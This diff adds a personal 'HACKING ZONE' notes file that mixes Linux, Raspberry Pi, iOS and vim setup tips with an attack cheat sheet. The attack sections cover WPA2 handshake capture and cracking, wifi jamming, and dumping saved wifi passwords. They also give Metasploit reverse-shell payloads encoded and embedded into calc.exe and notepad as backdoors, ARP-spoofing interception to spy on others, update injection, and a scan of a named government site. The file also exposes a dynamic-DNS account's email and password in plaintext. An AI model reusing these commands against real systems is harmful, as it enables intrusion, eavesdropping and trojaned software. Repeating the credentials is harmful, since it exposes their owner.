@@ -1,0 +1,3911 @@
+
+
+---->
+				HACKING ZONE
+
+Wifi Sniffing:
+### AIRCRACK ### 
+ifconfig
+airmon-ng check kill
+
+ifconfig wlan0 down
+airrmon-ng start wlan0
+airodump-ng mon0
+
+airodump-ng mon0 -c № --bssid 00:00:00:00:00 -w /root/wpa2psk
+aireplay-ng -0 0 -a -BSSID- -c -STATION- mon0
+aircrack-ng /root/wpa2psk-01.cap -w /root/password.lst
+			:::BOSS RASPBERRY-PI:::
+
+
+
+open new wired connection at ipv4 choose: sheared to other computer
+then type:
+
+cat /var/lib/misc/dnsmasq.leases
+
+To login:
+ssh pi@10.42.0.13
+password: raspberry
+
+
+
+VNC may need: apt-get install vinagre
+
+
+type: vncserver
+vncserver :x
+
+to kill: vncserver -kill :x
+
+
+
+
+
+Configuration: sudo raspi-config
+
+#################################Gnome Toolkit#########################
+apt-get install gnome-shell-extensions gnome-tweak-tool
+gnome-tweak-tool
+
+alt + F2 ----> r
+
+__________________________________________ Live Attacking Preview _____________________________________
+https://www.fireeye.com/cyber-map/threat-map.html 
+http://map.ipviking.com/ 
+http://cybermap.kaspersky.com/ 
+http://www.digitalattackmap.com/
+______________________________________________________________________________________________________
+Vulnerable scanners:
+
+nessus
+nikto
+joomscan
+owsap-zap
+powerfuzzer
+nmap
+vega
+webcruser
+wereshark
+
+kernel::
+
+prepare-kernel-sources
+
+			:::Evilgrade:::
+LLVM+Clang From Cydia
+
+Inject with update of PC or Wifi:
+installation:
+1> wget https://codeload.github.com/infobyte/evilgrade/zip/master
+2>cpan Data::Dump
+3> cpan -fi Net::DNS::SEC
+f - force
+i - install
+
+[Note: to ignore error:Can’t locate Data/Dump.pm in @INC (@INC contains: /etc/perl /usr/local/lib/perl/5.10.1 /usr/local/share/perl/5.10.1 /usr/lib/perl5 usr/share/perl5 /usr/lib/perl/5.10 /usr/share/perl/5.10 /usr/local/lib/site_perl .) at isrcore/Shell.pm line 28. - See more at: http://www.hacking-tutorial.com/tips-and-trick/evilgrade-2-0-error-on-backtrack-5-solved/#sthash.YTHgTcw6.dpuf]
+3> ./evilgrade
+
+
+
+:) Enjoy
+
+CPAN SHELL::::::----------------->
+perl -MCPAN -e 'shell'
+
+######################################### perl thread problem ###################
+ 4
+down vote
+accepted
+
+When you build Perl, you need to use -Dusethreads to make a build of Perl that supports threads.
+
+sh ./Configure -Dusethreads
+make test
+make install
+
+I personally use perlbrew to install Perl.
+
+perlbrew install 5.18.2 --as=5.18.2t -Dusethreads
+
+
+
+######################## armitage problem & solution#######################
+# Start the Postgresql Database
+/etc/init.d/postgresql start
+
+# Initialize the Metasploit Framework Database
+msfdb init
+
+# Run msfconsole
+msfconsole
+
+#################Illigal instruction 4, GCC problem and solution##############
+perl -pe 's/\x{00}\x{30}\x{93}\x{e4}/\x{00}\x{30}\x{93}\x{e5}/g;s/\x{00}\x{30}\x{d3}\x{e4}/\x{00}\x{30}\x{d3}\x{e5}/g;' < old_ios_binary > old_ios_binary_patched
+chmod +x old_ios_binary_patched
+ldid -s old_ios_binary_patched
+mv old_ios_binary old_ios_binary_original
+mv old_ios_binary_patched old_ios_binary
+
+
+If you have gnu sed in iOS or OS X, you can patch directly without the temp file in one step
+sed -i'' 's/\x00\x30\x93\xe4/\x00\x30\x93\xe5/g;s/\x00\x30\xd3\xe4/\x00\x30\xd3\xe5/g;' old_ios_binary
+ldid -s old_ios_binary
+
+
+iphone-gcc patched package for iPhone 5 / iPad 4 is here
+http://code.google.com/p/apiexplorer/downloads/list 
+
+________________________________________FINAL SOLUTIONS_______________________WORKING 100%___________
+sed -i'' ' s-\x00\x30\x93\xe4-\x00\x30\x93\xe5-g;s-­\x00\x30\xd3\xe4-\x00\x30\xd3\xe5-g;' /usr/bin/gcc
+ldid -s /usr/bin/gcc
+#####
+
+lynx http://coredev.nl/cydia/coredev.pub
+    Press 'd' for Download
+    Press cursor-down, to select 'Save to disk'
+    Press enter for the default filename (coredev.pub)
+    Press 'Q' to quit
+____________________________________________
+apt-key add coredev.pub
+
+and finally:
+
+echo 'deb http://coredev.nl/cydia iphone main' > /etc/apt/sources.list.d/coredev.nl.list
+
+
+################################ Another If The Upper tricks now works here #########################
+lynx http://zl0.nl/coredev/cydia/coredev.pub
+    Press 'd' for Download
+    Press cursor-down, to select 'Save to disk'
+    Press enter for the default filename (coredev.pub)
+    Press 'Q' to quit
+
+Once you have the file, on the (root) shell, run:
+
+apt-key add coredev.pub
+
+and finally:
+
+echo 'deb http://zl0.nl/coredev/cydia iphone main' > /etc/apt/sources.list.d/coredev.nl.list
+
+Now when you refresh Cydia, run apt-get update or aptitude update, you should be able to see my packages.
+
+##############################################
+		::METASPLOIT ATTACK::
+
+msfpayload android/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=443 R > hack.apk
+	[Note: For android]
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=443 R > hack.exe
+	[Note: For Windows]
+
+in msf> use exploit/multi/handler
+msf> set payload android/meterpreter/reverse_tcp [Note: For android]
+
+___________
+msfpayload windows/shell_reverse_tcp LHOST=192.168.31.20 LPORT=8080 R | msfencode -t exe -x /home/sathish/Downloads/calc.exe -k -o /var/www/calc_backdoor.exe -e x86/shikata_ga_nai -c 5
+
+______________________
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.8.92 LPORT=443 R | msfencode -e x86/shikata_ga_nai -c 5 -t exe -x /root/Desktop/NOTEPAD.EXE -o /root/Desktop/NOTEPAD2.EXE
+
+
+wifi:
+
+cmd: type 
+
+1. netsh wlan show profiles
+2. netsh wlan show profiles wifiname
+3. netsh wlan show profiles wifiname key=clear [will give the password]
+
+wifi jammer:
+1. python wifijammer.py -a 00:0E:DA:DE:24:8E -c 2
+2. python wifijammer.py -c 1 -p 5 -t .00001 -s DL:3D:8D:JJ:39:52 -d --   	world
+3. python wifijammer.py -m 10
+
+4. python wifijammer.py [-a AP MAC] [-c CHANNEL] [-d] [-i INTERFACE] [-m MAXIMUM]
+
+
+
+			MAN IN MIDDEL ATTACK ( Usefull to spy on other pc's connected in a network )
+
+1. router ip: 192.168.8.8
+2. victim ip: 192.168.8.90
+3. attaker ip
+
+
+steps: use multi split window on terminal
+
+> arpspoof -i wlan0 -t 192.168.8.90 192.168.8.8
+> arpspoof -i wlan0 -t 192.168.8.8 192.168.8.90
+> driftnet -i wlan0
+> urlsnarf -i wlan0
+
+
+Using Ettercap:
+> ettercap -C
+
+########################## RUNNING EXE ON RASPBERRY ########################################
+$ sudo apt-get install mono-runtime
+
+You can also (assuming you have some sort of GUI such as LXDE) install a slow Mono IDE with:
+
+$ sudo apt-get install monodevelop
+
+For Arch Linux ARM you need to install the runtime via Pacman, like so:
+
+$ sudo pacman -S mono
+
+The Mono IDE can be installed in a similar fashion:
+
+$ sudo pacman -S monodevelop
+
+
+
+
+> sudo apt-get install gtk-sharp2
+
+
+################################# ssh details ##############################################
+check ssh keys: ls -al ~/.ssh
+generating ssh key: ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
+###############################################################################################################
+
+	          :::INSTALLING VMWARE ON BACKTRACK 5/LINUX:::
+If you have backtrack installed on HDD or dualboot you can install virtualbox into Backtrack.. The commands are listed below:
+
+ 
+
+root@bt # prepare-kernel-sources
+
+root@bt # cd /usr/src/linux
+
+root@bt # cp -rf include/generated/* include/linux/
+
+ 
+
+After this is done, gedit /etc/apt/sources.list as shown below and download virtualbox
+
+root@bt # echo deb http://download.virtualbox.org/virtualbox/debian lucid contrib non-free >> /etc/apt/sources.list
+
+root@bt # wget -q http://download.virtualbox.org/virtualbox/debian/oracle_vbox.asc -O- | sudo apt-key add -
+
+root@bt # apt-get update
+
+root@bt # apt-cache search virtualbox
+
+root@bt # apt-get install virtualbox-4.0
+
+
+:::: In kali linux ::::
+
+1st: wget http://snapshot.debian.org/archive/debian/20110406T213352Z/pool/main/o/openssl098/libssl0.9.8_0.9.8o-7_amd64.deb
+2nd: dpkg -i libssl0.9.8_0.9.8o-7_amd64.deb
+then :
+echo deb http://download.virtualbox.org/virtualbox/debian lucid contrib non-free >> /etc/apt/sources.list 
+wget -q http://download.virtualbox.org/virtualbox/debian/oracle_vbox.asc -O- | sudo apt-key add - 
+apt-get update 
+apt-get install virtualbox-4.0
+sudo apt-get gnome
+
+################################ Linux conio.h getch problem & solution ##########################
+#include <ncurses.h>                                                   ^
+#include<stdio.h>                       visitor.cpp: At global scope:
+                                        visitor.cpp:62:6: error: ‘char getch’ re
+int main(void) {                        declared as different kind of symbol
+  initscr();                             char getch(void)
+  timeout(-1);                                ^~~~~
+  int c = getch();                      In file included from visitor.cpp:8:0:
+  endwin();                             /usr/include/curses.h:645:28: note: prev
+  printf ("%d %c\n", c, c);             ious declaration ‘int getch()’
+  return 0;                              extern NCURSES_EXPORT(int) getch (void)
+} 
+
+
+then compile 
+gcc test.c -o test -lncurses
+#######################XXXXXXXXXXXXXXXXXXXXXXXXXX#######################
+		Wine for kali linux::: Wine
+# dpkg --add-architecture i386 # apt-get update
+
+# apt-get update
+# apt-get install wine:i386
+
+# wine --version
+
+_____________dpkg force install_______
+dpkg -i --force-overwrite iphone.deb
+
+
+#######################XXXXXXXXXXXXXXXXXXXXXXXXXX#######################
+
+		:::PROBLEM update:::
+vim /etc/apt/sources.list
+
+disable others except expected link to be update
+
+
+optional: 
+
+gem update
+gem install rubygems-update
+update_rubygems
+gem update --system
+
+		::PROBLEM METASPLOIT RAKE GEM NOT FOUND:::
+
+install ruby 1.9.1 
+install rubygems
+
+
+gem install nokogiri -- --use-system-libraries=true --with-xml2-include=/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.9.sdk/usr/include/libxml2
+
+gem install nokogiri --use-system-libraries
+
+GOTO : cd /usr/share/metasploit-framework/            <—- it’s this bit everyone is missing!!!!!!!!!
+
+and type: bundle install
+_________________________________________________________________________
+				Cydia list:
+http://coredev.nl/cydia/
+http://apt-saurik.com/
+http://ininjas.com/repo
+http://repo666.ultrasn0w.com/
+http://apt.modmyi.com/
+
+Theworm.altervista.org/cydia repo. Then install libgcc and ettercap
+
+
+
+######################## Find ttyACM or COM port #################
+ls /dev/ttyACM*
+
+##################################################################
+Java compiling in terminal:
+
+javac filename.java
+java filename
+
+
+
+IOS/iPhone:
+
+install from cydia:
+search java inside cydia.
+install java/iphone
+
+check install: java/iphone, jdk-jm, jikes, java-sql etc.
+
+then install jikes(java compiler) separatly(if already, skip)
+then open terminal:
+
+E.g:
+create a.java
+jikes a.java -cp /usr/lib/rt.jar
+java a
+
+Output: here
+
+######################## search option / spotlight search ########################
+ALT + F2
+######################################################
+		add-apt-repository ::: Problem & solution
+
+apt-get install software-properties-common python-software-properties
+
+
+OR
+
+root@Lh4cKg:~# wget http://blog.anantshri.info/content/uploads/2010/09/add-apt-repository.sh.txt
+root@Lh4cKg:~# cp add-apt-repository.sh.txt /usr/sbin/add-apt-repository
+root@Lh4cKg:~# chmod o+x /usr/sbin/add-apt-repository
+root@Lh4cKg:~# chown root:root /usr/sbin/add-apt-repository
+
+
+then run add-apt-repository <bla bla bla>
+######################################################
+Problem: jdk 6 not supported.
+
+sudo add-apt-repository ppa:webupd8team/java
+sudo apt-get update
+sudo apt-get install oracle-java7-installer
+
+
+Restart Web browser.
+
+Only necessary if Firefox browser plugin is not working after installing Oracle Java:
+
+ln -s /usr/lib/jvm/java-7-oracle/jre/lib/<architecture>/libnpjp2.so ~/.mozilla/plugins
+
+
+OR
+
+To install the OpenJDK:
+
+JRE:
+
+sudo apt-get install openjdk-7-jre
+
+Web browser plugin:
+
+sudo apt-get install icedtea-plugin
+
+
+
+
+######################################################
+			NUM LOCK PROBLEM & SOLUTION
+
+use shift + clrt + num lk
+
+then press number if doesn't work yet then normally press num lk and check working...
+######################################################
+		Java directory
+
+> ls -l /usr/lib/jvm/
+######################################################
+
+Wicd network manager re-configure:
+
+type: /etc/init.d/wicd restart
+
+[Note: apt-get remove network-manager] will remove **** don't use this
+unless it's complicated.
+
+
+
+
+Python Gui:
+
+install gui packages: python -m tkinter
+
+Python web normally works as php as well as it works inside print command.
+ E.g: print "<html><body></body></html>
+
+
+
+
+#########################################################
+		Installing .deb file
+ dpkg -i packagename.deb
+
+
+#########################################################
+
+----->
+sftp 192.168.1.101
+
+put -r localDirectory
+
+get filename
+
+############################### ssh @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Solution:
+> vim ~/.ssh/known_hosts
+and delete using 'dd' at the line number shown like:
+#### Add correct host key in /root/.ssh/known_hosts to get rid of this message.
+Offending RSA key in /root/.ssh/known_hosts:7 ####
+> :wq
+
+
+___________________________________ Changing Vim color enabling vi syntax color _______________________________
+find it if exists: .vimrc 
+
+type vi .vimrc and place / ~/.vimrc
+
+[Note: if found change it:]
+
+syntax on
+
+colorscheme desert
+
+_____________ Inside Command Vim _______________________
+:command -nargs=+ Say :echo "<args>"
+
+Now when you type
+
+	:Say Hello World
+
+Vim echoes "Hello World".  However, if you add a double quote, it won't work.
+For example:
+
+	:Say he said "hello"
+
+To get special characters turned into a string, properly escaped to use as an
+expression, use "<q-args>":
+
+	:command -nargs=+ Say :echo <q-args>
+
+Now the above ":Say" command will result in this to be executed:
+
+	:echo "he said \"hello\""
+
+The <f-args> keyword contains the same information as the <args> keyword,
+except in a format suitable for use as function call arguments.  For example:
+
+	:command -nargs=* DoIt :call AFunction(<f-args>)
+	:DoIt a b c
+
+Executes the following command:
+
+	:call AFunction("a", "b", "c")
+
+______________________________Default vimrc file_________________________________________________
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" Maintainer: 
+"       Amir Salihefendic
+"       http://amix.dk - amix@amix.dk
+"
+" Version: 
+"       5.0 - 29/05/12 15:43:36
+"
+" Blog_post: 
+"       http://amix.dk/blog/post/19691#The-ultimate-Vim-configuration-on-Github
+"
+" Awesome_version:
+"       Get this config, nice color schemes and lots of plugins!
+"
+"       Install the awesome version from:
+"
+"           https://github.com/amix/vimrc
+"
+" Syntax_highlighted:
+"       http://amix.dk/vim/vimrc.html
+"
+" Raw_version: 
+"       http://amix.dk/vim/vimrc.txt
+"
+" Sections:
+"    -> General
+"    -> VIM user interface
+"    -> Colors and Fonts
+"    -> Files and backups
+"    -> Text, tab and indent related
+"    -> Visual mode related
+"    -> Moving around, tabs and buffers
+"    -> Status line
+"    -> Editing mappings
+"    -> vimgrep searching and cope displaying
+"    -> Spell checking
+"    -> Misc
+"    -> Helper functions
+"
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" => General
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" Sets how many lines of history VIM has to remember
+set history=700
+
+" Enable filetype plugins
+filetype plugin on
+filetype indent on
+
+" Set to auto read when a file is changed from the outside
+set autoread
+
+" With a map leader it's possible to do extra key combinations
+" like <leader>w saves the current file
+let mapleader = ","
+let g:mapleader = ","
+
+" Fast saving
+nmap <leader>w :w!<cr>
+
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" => VIM user interface
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" Set 7 lines to the cursor - when moving vertically using j/k
+set so=7
+
+" Turn on the WiLd menu
+set wildmenu
+
+" Ignore compiled files
+set wildignore=*.o,*~,*.pyc
+
+"Always show current position
+set ruler
+
+" Height of the command bar
+set cmdheight=2
+
+" A buffer becomes hidden when it is abandoned
+set hid
+
+" Configure backspace so it acts as it should act
+set backspace=eol,start,indent
+set whichwrap+=<,>,h,l
+
+" Ignore case when searching
+set ignorecase
+
+" When searching try to be smart about cases 
+set smartcase
+
+" Highlight search results
+set hlsearch
+
+" Makes search act like search in modern browsers
+set incsearch
+
+" Don't redraw while executing macros (good performance config)
+set lazyredraw
+
+" For regular expressions turn magic on
+set magic
+
+" Show matching brackets when text indicator is over them
+set showmatch
+" How many tenths of a second to blink when matching brackets
+set mat=2
+
+" No annoying sound on errors
+set noerrorbells
+set novisualbell
+set t_vb=
+set tm=500
+
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" => Colors and Fonts
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" Enable syntax highlighting
+syntax enable
+
+colorscheme desert
+set background=dark
+
+" Set extra options when running in GUI mode
+if has("gui_running")
+    set guioptions-=T
+    set guioptions+=e
+    set t_Co=256
+    set guitablabel=%M\ %t
+endif
+
+" Set utf8 as standard encoding and en_US as the standard language
+set encoding=utf8
+
+" Use Unix as the standard file type
+set ffs=unix,dos,mac
+
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" => Files, backups and undo
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" Turn backup off, since most stuff is in SVN, git et.c anyway...
+set nobackup
+set nowb
+set noswapfile
+
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" => Text, tab and indent related
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" Use spaces instead of tabs
+set expandtab
+
+" Be smart when using tabs ;)
+set smarttab
+
+" 1 tab == 4 spaces
+set shiftwidth=4
+set tabstop=4
+
+" Linebreak on 500 characters
+set lbr
+set tw=500
+
+set ai "Auto indent
+set si "Smart indent
+set wrap "Wrap lines
+
+
+""""""""""""""""""""""""""""""
+" => Visual mode related
+""""""""""""""""""""""""""""""
+" Visual mode pressing * or # searches for the current selection
+" Super useful! From an idea by Michael Naumann
+vnoremap <silent> * :call VisualSelection('f')<CR>
+vnoremap <silent> # :call VisualSelection('b')<CR>
+
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" => Moving around, tabs, windows and buffers
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" Treat long lines as break lines (useful when moving around in them)
+map j gj
+map k gk
+
+" Map <Space> to / (search) and Ctrl-<Space> to ? (backwards search)
+map <space> /
+map <c-space> ?
+
+" Disable highlight when <leader><cr> is pressed
+map <silent> <leader><cr> :noh<cr>
+
+" Smart way to move between windows
+map <C-j> <C-W>j
+map <C-k> <C-W>k
+map <C-h> <C-W>h
+map <C-l> <C-W>l
+
+" Close the current buffer
+map <leader>bd :Bclose<cr>
+
+" Close all the buffers
+map <leader>ba :1,1000 bd!<cr>
+
+" Useful mappings for managing tabs
+map <leader>tn :tabnew<cr>
+map <leader>to :tabonly<cr>
+map <leader>tc :tabclose<cr>
+map <leader>tm :tabmove
+
+" Opens a new tab with the current buffer's path
+" Super useful when editing files in the same directory
+map <leader>te :tabedit <c-r>=expand("%:p:h")<cr>/
+
+" Switch CWD to the directory of the open buffer
+map <leader>cd :cd %:p:h<cr>:pwd<cr>
+
+" Specify the behavior when switching between buffers 
+try
+  set switchbuf=useopen,usetab,newtab
+  set stal=2
+catch
+endtry
+
+" Return to last edit position when opening files (You want this!)
+autocmd BufReadPost *
+     \ if line("'\"") > 0 && line("'\"") <= line("$") |
+     \   exe "normal! g`\"" |
+     \ endif
+" Remember info about open buffers on close
+set viminfo^=%
+
+
+""""""""""""""""""""""""""""""
+" => Status line
+""""""""""""""""""""""""""""""
+" Always show the status line
+set laststatus=2
+
+" Format the status line
+set statusline=\ %{HasPaste()}%F%m%r%h\ %w\ \ CWD:\ %r%{getcwd()}%h\ \ \ Line:\ %l
+
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" => Editing mappings
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" Remap VIM 0 to first non-blank character
+map 0 ^
+
+" Move a line of text using ALT+[jk] or Comamnd+[jk] on mac
+nmap <M-j> mz:m+<cr>`z
+nmap <M-k> mz:m-2<cr>`z
+vmap <M-j> :m'>+<cr>`<my`>mzgv`yo`z
+vmap <M-k> :m'<-2<cr>`>my`<mzgv`yo`z
+
+if has("mac") || has("macunix")
+  nmap <D-j> <M-j>
+  nmap <D-k> <M-k>
+  vmap <D-j> <M-j>
+  vmap <D-k> <M-k>
+endif
+
+" Delete trailing white space on save, useful for Python and CoffeeScript ;)
+func! DeleteTrailingWS()
+  exe "normal mz"
+  %s/\s\+$//ge
+  exe "normal `z"
+endfunc
+autocmd BufWrite *.py :call DeleteTrailingWS()
+autocmd BufWrite *.coffee :call DeleteTrailingWS()
+
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" => vimgrep searching and cope displaying
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" When you press gv you vimgrep after the selected text
+vnoremap <silent> gv :call VisualSelection('gv')<CR>
+
+" Open vimgrep and put the cursor in the right position
+map <leader>g :vimgrep // **/*.<left><left><left><left><left><left><left>
+
+" Vimgreps in the current file
+map <leader><space> :vimgrep // <C-R>%<C-A><right><right><right><right><right><right><right><right><right>
+
+" When you press <leader>r you can search and replace the selected text
+vnoremap <silent> <leader>r :call VisualSelection('replace')<CR>
+
+" Do :help cope if you are unsure what cope is. It's super useful!
+"
+" When you search with vimgrep, display your results in cope by doing:
+"   <leader>cc
+"
+" To go to the next search result do:
+"   <leader>n
+"
+" To go to the previous search results do:
+"   <leader>p
+"
+map <leader>cc :botright cope<cr>
+map <leader>co ggVGy:tabnew<cr>:set syntax=qf<cr>pgg
+map <leader>n :cn<cr>
+map <leader>p :cp<cr>
+
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" => Spell checking
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" Pressing ,ss will toggle and untoggle spell checking
+map <leader>ss :setlocal spell!<cr>
+
+" Shortcuts using <leader>
+map <leader>sn ]s
+map <leader>sp [s
+map <leader>sa zg
+map <leader>s? z=
+
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" => Misc
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" Remove the Windows ^M - when the encodings gets messed up
+noremap <Leader>m mmHmt:%s/<C-V><cr>//ge<cr>'tzt'm
+
+" Quickly open a buffer for scripbble
+map <leader>q :e ~/buffer<cr>
+
+" Toggle paste mode on and off
+map <leader>pp :setlocal paste!<cr>
+
+
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+" => Helper functions
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+function! CmdLine(str)
+    exe "menu Foo.Bar :" . a:str
+    emenu Foo.Bar
+    unmenu Foo
+endfunction
+
+function! VisualSelection(direction) range
+    let l:saved_reg = @"
+    execute "normal! vgvy"
+
+    let l:pattern = escape(@", '\\/.*$^~[]')
+    let l:pattern = substitute(l:pattern, "\n$", "", "")
+
+    if a:direction == 'b'
+        execute "normal ?" . l:pattern . "^M"
+    elseif a:direction == 'gv'
+        call CmdLine("vimgrep " . '/'. l:pattern . '/' . ' **/*.')
+    elseif a:direction == 'replace'
+        call CmdLine("%s" . '/'. l:pattern . '/')
+    elseif a:direction == 'f'
+        execute "normal /" . l:pattern . "^M"
+    endif
+
+    let @/ = l:pattern
+    let @" = l:saved_reg
+endfunction
+
+
+" Returns true if paste mode is enabled
+function! HasPaste()
+    if &paste
+        return 'PASTE MODE  '
+    en
+    return ''
+endfunction
+
+" Don't close window, when deleting a buffer
+command! Bclose call <SID>BufcloseCloseIt()
+function! <SID>BufcloseCloseIt()
+   let l:currentBufNum = bufnr("%")
+   let l:alternateBufNum = bufnr("#")
+
+   if buflisted(l:alternateBufNum)
+     buffer #
+   else
+     bnext
+   endif
+
+   if bufnr("%") == l:currentBufNum
+     new
+   endif
+
+   if buflisted(l:currentBufNum)
+     execute("bdelete! ".l:currentBufNum)
+   endif
+endfunction
+
+
+
+
+_________________________________________________________________________________________________
+
+_______________________________________________________________________________
+Installing wine latest version & missing repositories:
+-----------------------------------------------------------
+
+.NET executable wine:
+steps:
+-----
+1. add-apt-repository ppa:ubuntu-wine/ppa
+2. apt-get update; apt-get upgrade -y
+3. apt-get install winetricks -y
+
+[Note: Never run wine as root (su, sudo)! Wine doesn’t require to be run as root! Click Here for info.]
+
+4. Install .Net 2.0 using winetricks
+
+    winetricks dotnet20
+    -------------------
+
+5. Now, you can install or run Keepass or any other application with Wine with command provided below
+
+    wine <softwarename>.exe
+
+ __________ For Kali Linux __________
+
+1st -> wget http://winetricks.googlecode.com/svn/trunk/src/winetricks
+2nd -> bash winetricks dotnet20
+
+Then....
+
+WINEARCH=win32 WINEPREFIX=~/.wine32 winecfg [Note: Configuration ]
+
+
+env WINEARCH=win32 WINEPREFIX=~/.wine32 winetricks dotnet20
+or
+env WINEPREFIX=~/.wine32 winetricks dotnet20
+
+#############################################################
+Missing: after upgrade
+1. beef
+2. w3af
+3. set
+
+
+Sol:
+(2) git clone https://github.com/andresriancho/w3af.git [Note: apt-get install git.]
+Then:
+
+cd w3af/
+./w3af_console
+. /tmp/w3af_dependency_install.sh
+
+
+[Note: nano /var/lib/dpkg/info/w3af.postinst. replace the url into: "https://svn.code.sf.net/p/w3af/code/trunk". Run apt-get install w3af.]
+
+OR
+
+i download the the esmre source code and install it manually ,
+
+then i remove /usr/share/w3af
+
+cd /usr/share/
+
+
+and
+
+git clone https://github.com/andresriancho/w3af.git
+cd w3af
+w3af
+
+it workable , 
+
+(3) 
+
+ 1) Remove old SET
+
+     First try removing SET using dpkg by entering the command:
+
+     dpkg -r set
+
+     If unsuccessful, remove old SET by navigating to /pentest/exploits/set. Make sure you're in that directory (you can use the pwd command to check), and use the rm command to remove all files present
+
+
+2) Install git clone into /pentest/exploits/set using this command:
+
+     git clone https://github.com/trustedsec/social-engineer-toolkit/ set/
+
+3) The menu shortcut needs to be updated, so edit the menu properties and point the SET shortcut to "./se-toolkit"
+
+4) Lastly, check the SET directory and change the line in the set.conf file for the correct metasploit db path
+
+5) Launch
+
+
+(1) 
+apt-get install beef
+[Note: sudo gedit /var/lib/dpkg/info/beef.postinst
+       sudo gedit /var/lib/dpkg/info/subterfuge.postinst
+
+add both file at :
+
+#!/bin/bash
+set -e
+exit 0
+
+and save.]
+___________________________________________________________
+
+
+
+
+
+
+SSH from iPhone to PC(linux): service ssh status (pc)
+sudo ufw allow ssh
+
+
+........................................
+php.ini location: /etc/php5/apache2/php.ini
+_________________________________________
+
+
+Sendmail installation:::
+1. apt-get install postfix
+
+
+
+#############################################
+Sound Configuration on Backtrack...
+
+go to: System/Preference/Startup Applications
+
+now (add)
+
+Name = anything you want
+command = /usr/bin/pulseaudio
+comment = anything you want
+
+: )
+
+logout or reboot .. and Enjoy : P
+
+......................................................
+
+Remote File Download::::::
+sftp <remote machine>
+sftp> get file.txt
+
+to send:
+sftp> put file.txt
+
+
+
+########## REMOVING / UNINSTALLING ############
+1. apt-get remove apache2*
+2. apt-get autoremove
+3. dpkg -S `which apache2`
+###############################################
+#################### ssh connection refused problem ###########################
+service ssh status ------> your pc
+ufw allow ssh ------------> your pc
+
+##############################################################################
+
+Browser commands:
+_________________
+
+about:config
+about:networking
+about:support (restore default firefox)
+
+___________________________________________________
+
+
+
+
+KILL PORT :
+kill `sudo lsof -t -i:80`
+fuser -n tcp -k 80
+for any python process: ps -fA | grep python
+kill -9 port
+OR
+lsof -i :port
+kill -9 port
+
+
+
+
+COM PORT FIXING
+minicom -c on
+minicom -s
+
+
+$$$$$$$$$$$$$$$$$$ LIST OF USB PORT $$$$$$$$$$$$$$$$$$
+
+lsusb -t|less
+
+dmesg|tail
+lsusb
+df -h (mount list drive)
+
+$$$$$$$$$$$$$$$$$$$ ############### @@@@@@@@@@@@@@@
+
+
+$$$$$$$$$$$$$ SLEEP ################
+
+echo 'pm-suspend' | at now + 30 minutes
+pm-hibernate
+
+
+xset -display :0.0 dpms force off 
+
+ xset s off  --> display off
+
+ xset -q
+
+xset -dpms
+xset +dpms
+
+
+
+
+Nessus Vulnerable scanner browser url : https://127.0.0.1:8834
+uniscan -u http://yyy.com -q -r
+
+
+
+
+
+www.no-ip.biz  (DNS)
+usre : darkmoonnight
+darkmoonnightrider@gmail.com
+12358voot
+
+host: darkmoonnightrider.ddns.net 	59.152.99.3 
+
+type: make
+	make install
+
+
+
+gedit /etc/apt/sources.list
+
+
+###########################
+Shutdown Timer
+shutdown -h 21:45
+###########################
+
+$$$$$$$$$$$$$$$$
+Remote server using login
+
+ssh -l username remote-server
+
+$$$$$$$$$$$$$$$$
+
+perl nikto.pl -h www.ictd.gov.bd
+
+################# Clear Caches ###################
+IFILE CONFIGURING iPhone 
+
+rm /User/Library/Caches/com.apple.LaunchServices-102.csstore
+##################################################
+
+PORT SCAN USING NET CUT: nc -z 192.168.1.1 1-2000
+$$$$$$$$$$$$$$$$$$$$$
+
+root@bt:/usr/local/bin# noip2 -C
+
+Auto configuration for Linux client of no-ip.com.
+
+Please enter the login/email string for no-ip.com  
+darkmoonnightrider@gmail.com
+Please enter the password for user 'darkmoonnightrider@gmail.com'  
+*********
+
+2 hosts are registered to this account.
+Do you wish to have them all updated?[N] (y/N)  y
+Please enter an update interval:[30]  
+Do you wish to run something at successful update?[N] (y/N)  y
+Please enter the script/program name  
+
+New configuration file '/usr/local/etc/no-ip2.conf' created.
+
+$$$$$$$$$$$$$$$$$$$$$
+
+
+############### mono c# sol and commands ##############
+vim Demo1.cs
+
+    Now install a package called mono-mcs,which is a c# compiler,
+
+sudo apt-get install mono-mcs
+
+    Compiling the program and generating .exe file,
+
+mcs Demo1.cs
+
+    Executing the program,
+
+mono Demo1.exe
+################### Recently Installed Packages ##########
